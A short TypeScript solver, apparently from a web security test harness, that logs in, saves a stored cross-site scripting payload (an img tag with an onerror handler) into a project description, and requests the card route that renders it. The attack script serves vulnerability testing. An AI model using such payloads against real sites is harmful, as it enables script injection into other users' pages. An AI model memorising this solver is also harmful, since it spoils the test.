// Stored markup in a project description rendered on the card: save a description carrying an
// event-handler attribute, then request the card render route where it is emitted into the page.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  const list = await ctx.fetch(ctx.path('listProjects'), { session: owner })
  const items = (list.json?.items ?? []) as Array<{ id: string }>
  const target = items[0]
  if (!target) return
  await ctx.fetch(ctx.path('updateProject', { projectId: target.id }), {
    method: 'PATCH',
    session: owner,
    body: { description: '<img src=x onerror="fetch(1)">' },
  })
  await ctx.fetch(ctx.path('renderProjectCard', { projectId: target.id }), { session: owner })
}
